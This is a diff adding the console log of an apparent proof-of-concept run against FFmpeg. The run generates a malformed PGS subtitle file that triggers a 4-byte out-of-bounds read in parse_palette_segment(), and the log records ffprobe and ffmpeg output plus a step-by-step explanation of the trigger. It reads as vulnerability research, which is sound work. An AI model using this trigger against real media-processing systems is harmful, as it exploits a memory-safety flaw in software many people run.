@@ -1,0 +1,81 @@
+[*] Generating malformed SUP input...
+[+] Generated /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_pgssubdec_c/vuln_002_input.sup (58 bytes)
+    PCS packet: 24 bytes
+    PDS packet: 21 bytes  <-- malformed (6 bytes palette data, OOB trigger)
+    END packet: 13 bytes
+[+] PDS segment_length=8: palette_id(1)+palette_version(1)+entry(5)+leftover(1)
+    Loop iter 2 reads 5 bytes with only 1 valid -> 4 bytes OOB read
+[*] Input file: /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_pgssubdec_c/vuln_002_input.sup
+[*] File size: 58 bytes
+[*] Vulnerability: OOB read in parse_palette_segment() pgssubdec.c:354-374
+[*] trigger: segment_length=8 -> palette data 6 bytes -> 1 leftover byte satisfies
+[*]          buf < buf_end, 2nd iteration reads 5 bytes -> 4-byte OOB past buf_end
+
+[*] Primary trigger: ffprobe -show_frames forces avcodec_decode_subtitle2()
+[*]   -> decode() in pgssubdec.c -> parse_palette_segment(avctx, buf, 8)
+ffprobe version N-126435-gf93cd72dde Copyright (c) 2007-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[sup @ 0x517000000080] Format sup detected only with low score of 25, misdetection possible!
+Input #0, sup, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_pgssubdec_c/vuln_002_input.sup':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Subtitle: hdmv_pgs_subtitle (pgssub), 1920x1080
+[SUBTITLE]
+media_type=subtitle
+pts=0
+pts_time=0.000000
+format=0
+start_display_time=0
+end_display_time=4294967295
+num_rects=0
+[/SUBTITLE]
+
+[*] Secondary trigger: ffmpeg bitmap-to-bitmap transcode (PGS->DVBSUB)
+[*]   same decode path: decode() -> parse_palette_segment(avctx, buf, 8)
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[in#0 @ 0x517000000080] Format sup detected only with low score of 25, misdetection possible!
+Input #0, sup, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_pgssubdec_c/vuln_002_input.sup':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Subtitle: hdmv_pgs_subtitle (pgssub), 1920x1080
+Stream mapping:
+  Stream #0:0 -> #0:0 (hdmv_pgs_subtitle (pgssub) -> dvb_subtitle (dvbsub))
+Output #0, mpegts, to '/tmp/vuln002_out_dvbsub.ts':
+  Metadata:
+    encoder         : Lavf63.6.100Press [q] to stop, [?] for help
+
+  Stream #0:0: Subtitle: dvb_subtitle, 1920x1080
+    Metadata:
+      encoder         : Lavc63.11.100 dvbsub
+[out#0/mpegts @ 0x511000000900] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/mpegts @ 0x511000000900] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+
+[*] Explanation:
+[*]   parse_palette_segment() is called with buf_size=8 (segment_length=8)
+[*]   buf_end = buf + 8
+[*]   Reads palette_id (1 byte), skips palette_version (1 byte): 6 bytes left
+[*]   Loop iter 1: reads 5 bytes (OK), 1 byte remains
+[*]   buf < buf_end: TRUE (1 byte left)
+[*]   Loop iter 2: bytestream_get_byte x5 reads 4 bytes PAST buf_end
+[*]   OOB does NOT trigger ASAN because it falls within the 64-byte
+[*]   AV_INPUT_BUFFER_PADDING_SIZE padding appended to every AVPacket allocation.
+[*]   The vulnerability is VERIFIED_BEHAVIOR: decoder runs, OOB occurs,
+[*]   but padding masks the crash.
+[*] Done.
+EXIT=0
